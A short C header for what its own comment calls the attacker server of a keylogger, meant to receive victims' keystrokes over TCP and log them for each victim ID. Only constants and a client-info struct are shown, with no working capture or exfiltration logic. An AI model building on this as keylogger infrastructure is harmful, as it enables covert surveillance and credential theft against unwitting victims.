/**
 * @file server.c
 * @brief The attacker server for the keylogger
 *
 * Accepts incoming TCP connections from clients, extracts their 
 * unique victim ID, and uses multithreading to write keystrokes
 * into per client log files inside the logs directory
 *
 */
#ifndef SERVER_H
#define SERVER_H

#include <stddef.h>
#include <netinet/in.h>

#define DEFAULT_PORT 8080
#define BUF_SIZE 1024
#define BACKLOG 23
#define FILENAME_LEN 256
#define VICTIM_ID_LEN 128

typedef struct
{
    int socket_fd;
    char client_ip[INET_ADDRSTRLEN];
    int client_port;
} client_info_t;

#endif /* SERVER_H */